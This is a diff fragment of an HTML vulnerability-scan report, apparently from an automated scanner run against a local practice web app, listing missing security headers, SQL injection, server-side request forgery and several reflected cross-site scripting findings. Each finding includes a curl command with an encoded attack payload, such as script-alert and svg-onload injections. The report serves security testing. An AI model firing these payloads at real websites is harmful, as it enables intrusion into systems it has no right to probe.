+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-XSS-Protection is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-Content-Type-Options is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Strict-Transport-Security is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-Frame-Options is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-XSS-Protection is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-Content-Type-Options is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Strict-Transport-Security is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: SQL Injection</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: SQL Injection (DMBS: MySQL) via injection in the parameter firstname</span>
+        <p></p>
+        <span class="d-block">Solution: To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/SQL/sql1.php&quot; -e &quot;http://localhost:9991/www/SQL/sql1.php&quot; -d &quot;firstname=default%C2%BF%27%22%28&amp;submit=Submit&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Server Side Request Forgery</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: SSRF vulnerability via injection in the parameter file.
+The target performed an outgoing HTTP GET request at 2021-08-02T21:47:29+02:00 with IP 94.73.60.148.
+Full request can be seen at https://wapiti3.ovh/ssrf_data/f74q2p/50/66696c65/1627933649-94.73.60.148.txt</span>
+        <p></p>
+        <span class="d-block">Solution: Every URI received by the web application should be checked, especially scheme and hostname. A whitelist should be used.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/FileInclusion/pages/lvl1.php?file=http%3A%2F%2Fexternal.url%2Fpage&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Cross Site Scripting</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: XSS vulnerability found via injection in the parameter file</span>
+        <p></p>
+        <span class="d-block">Solution: The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:&lt;, &gt;, &amp;, &#39;, (, ), #, %, ; , +, -</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/FileInclusion/pages/lvl1.php?file=%3CScRiPt%3Ealert%28%27wg87f98z3l%27%29%3C%2FsCrIpT%3E&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Cross Site Scripting</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: XSS vulnerability found via injection in the parameter file</span>
+        <p></p>
+        <span class="d-block">Solution: The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:&lt;, &gt;, &amp;, &#39;, (, ), #, %, ; , +, -</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/FileInclusion/pages/lvl2.php?file=%3CScRiPt%3Ealert%28%27w5mz45imhj%27%29%3C%2FsCrIpT%3E&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Cross Site Scripting</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: XSS vulnerability found via injection in the parameter username</span>
+        <p></p>
+        <span class="d-block">Solution: The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:&lt;, &gt;, &amp;, &#39;, (, ), #, %, ; , +, -</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/XSS/XSS_level1.php?username=%3CScRiPt%3Ealert%28%27wikpzxxpes%27%29%3C%2FsCrIpT%3E&amp;submit=Submit&quot; -e &quot;http://localhost:9991/www/XSS/XSS_level1.php&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Cross Site Scripting</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: XSS vulnerability found via injection in the parameter username</span>
+        <p></p>
+        <span class="d-block">Solution: The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:&lt;, &gt;, &amp;, &#39;, (, ), #, %, ; , +, -</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/XSS/XSS_level2.php?username=%3CScRiPt%3Ealert%28%27w9r6y3ymds%27%29%3C%2FsCrIpT%3E&amp;submit=Submit&quot; -e &quot;http://localhost:9991/www/XSS/XSS_level2.php&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Cross Site Scripting</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: XSS vulnerability found via injection in the parameter username</span>
+        <p></p>
+        <span class="d-block">Solution: The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:&lt;, &gt;, &amp;, &#39;, (, ), #, %, ; , +, -</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/XSS/XSS_level3.php?username=%3CSvG%2FoNloAd%3Dalert%28%2Fwrbjv5jzm4%2F%29%3E&amp;submit=Submit&quot; -e &quot;http://localhost:9991/www/XSS/XSS_level3.php&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Cross Site Scripting</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: XSS vulnerability found via injection in the parameter username</span>
+        <p></p>
+        <span class="d-block">Solution: The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:&lt;, &gt;, &amp;, &#39;, (, ), #, %, ; , +, -</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/XSS/XSS_level4.php?username=%3CSvG%2FoNloAd%3Dalert%28%2Fwhjx6l6hy9%2F%29%3E&amp;submit=Submit&quot; -e &quot;http://localhost:9991/www/XSS/XSS_level4.php&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Cross Site Scripting</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: XSS vulnerability found via injection in the parameter number</span>
+        <p></p>
+        <span class="d-block">Solution: The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:&lt;, &gt;, &amp;, &#39;, (, ), #, %, ; , +, -</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/SQL/sql2.php&quot; -e &quot;http://localhost:9991/www/SQL/sql2.php&quot; -d &quot;number=%3CScRiPt%3Ealert%28%27wdv2v00p3i%27%29%3C%2FsCrIpT%3E&amp;submit=Submit&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Cross Site Scripting</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: XSS vulnerability found via injection in the parameter number</span>
+        <p></p>
+        <span class="d-block">Solution: The best way to protect a web application from XSS attacks is ensure that the application performs validation of all headers, cookies, query strings, form fields, and hidden fields. Encoding user supplied output in the server side can also defeat XSS vulnerabilities by preventing inserted scripts from being transmitted to users in an executable form. Applications can gain significant protection from javascript based attacks by converting the following characters in all generated output to the appropriate HTML entity encoding:&lt;, &gt;, &amp;, &#39;, (, ), #, %, ; , +, -</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/SQL/sql4.php&quot; -e &quot;http://localhost:9991/www/SQL/sql4.php&quot; -d &quot;number=%3CScRiPt%3Ealert%28%22w6r870tlut%22%29%3C%2FsCrIpT%3E&amp;submit=Submit&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    
+</main>
+
+
+<script src="/static/js/bootstrap.bundle.min.js"></script>
+
+<script src="https://unpkg.com/feather-icons"></script>
+</script>
+<script src="/static/js/dashboard.js"></script>
+
+</html>
+    
+<!doctype html>
+<html lang="es-es">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="">
+
+  <title>Report</title>
+
+
+
+
+  <!-- Bootstrap core CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet"
+    integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+
+
+  <style>
